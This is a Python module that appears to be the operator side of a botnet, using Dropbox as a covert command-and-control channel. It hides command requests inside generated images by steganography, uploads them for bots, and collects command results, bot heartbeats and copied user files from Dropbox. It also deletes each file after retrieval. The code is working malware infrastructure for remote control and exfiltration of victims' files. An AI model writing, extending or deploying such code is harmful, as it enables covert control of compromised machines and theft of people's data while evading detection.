from typing import List

from common.data.heartbeat import Heartbeat
from common.dropbox_wrapper import list_files, DropboxFolders, create_folder, upload_file, \
    list_files_in_folder, download_file, delete_file_in_folder, download_all_files_from_folder, download_file_to_path
from common.data.commands import CommandExecutionRequest, CommandExecutionResult
from common.image_generators.image_generator import generate_image
from common.steganography import insert_command_request_into_image, read_command_result_from_image, \
    read_heartbeat_from_image
from common.utils.string_utils import generate_unique_image_name

__IMAGE_HORIZONTAL_DIMENSION = 640
__IMAGE_VERTICAL_DIMENSION = 480


def init_dropbox_handler() -> None:
    missing_folders = __get_missing_essential_folders_from_dropbox()
    __create_missing_folders(missing_folders)


def __get_missing_essential_folders_from_dropbox() -> List[DropboxFolders]:
    files = list_files()
    required_folders = set([folder.value for folder in DropboxFolders])
    for file in files:
        if file.name in required_folders:
            required_folders.remove(file.name)

    missing_folders = [DropboxFolders(folder) for folder in required_folders]
    return missing_folders


def __create_missing_folders(folders: List[DropboxFolders]) -> None:
    for folder in folders:
        create_folder(folder)


def upload_command_to_dropbox(command: CommandExecutionRequest) -> None:
    generated_image = generate_image(__IMAGE_HORIZONTAL_DIMENSION, __IMAGE_VERTICAL_DIMENSION)
    image_with_secret = insert_command_request_into_image(generated_image, command)
    upload_file(DropboxFolders.COMMAND_REQUESTS, generate_unique_image_name(), image_with_secret)


def download_and_delete_command_execution_results_from_dropbox() -> List[CommandExecutionResult]:
    downloaded_files = download_all_files_from_folder(DropboxFolders.COMMAND_RESULTS)
    command_results = []
    for file in downloaded_files:
        command_results.append(read_command_result_from_image(file.payload))
        delete_file_in_folder(DropboxFolders.COMMAND_RESULTS, file.name)
    return command_results


def download_heartbeats() -> List[Heartbeat]:
    downloaded_files = download_all_files_from_folder(DropboxFolders.BOT_HEARTBEATS)
    heartbeats = map(lambda file: read_heartbeat_from_image(file.payload), downloaded_files)
    return list(heartbeats)


def download_copied_files_from_dropbox() -> List[str]:
    files_to_download = list_files_in_folder(DropboxFolders.COPIED_USER_FILES)
    downloaded_files = []
    for file in files_to_download:
        downloaded_files.append(file.name)
        download_file_to_path(DropboxFolders.COPIED_USER_FILES, file.name, f"./master/copied_files/{file.name}")
        delete_file_in_folder(DropboxFolders.COPIED_USER_FILES, file.name)
    return downloaded_files
